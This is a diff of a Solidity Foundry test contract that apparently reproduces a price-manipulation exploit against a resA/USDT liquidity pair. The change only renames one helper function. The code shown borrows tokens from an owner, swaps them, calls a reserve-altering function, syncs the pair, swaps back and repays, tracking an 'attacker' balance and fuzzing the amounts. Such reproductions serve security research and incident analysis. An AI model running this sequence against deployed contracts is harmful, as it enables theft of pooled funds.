@@ -255,7 +255,7 @@ contract RESTest is Test, BlockLoader {
         pair.sync();
     }
 
-    function breaklr_pair_resA() internal {
+    function addliquidity_pair_resA() internal {
         resA.thisAToB();
     }
 
@@ -265,7 +265,7 @@ contract RESTest is Test, BlockLoader {
         printBalance("After step0 ");
         swap_pair_resA_usdt(resA.balanceOf(attacker));
         printBalance("After step1 ");
-        breaklr_pair_resA();
+        addliquidity_pair_resA();
         printBalance("After step2 ");
         sync_pair();
         printBalance("After step3 ");
@@ -287,7 +287,7 @@ contract RESTest is Test, BlockLoader {
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_owner_resA(amt0);
         swap_pair_resA_usdt(amt1);
-        breaklr_pair_resA();
+        addliquidity_pair_resA();
         sync_pair();
         swap_pair_usdt_resA(amt2);
         payback_owner_resA(amt3);
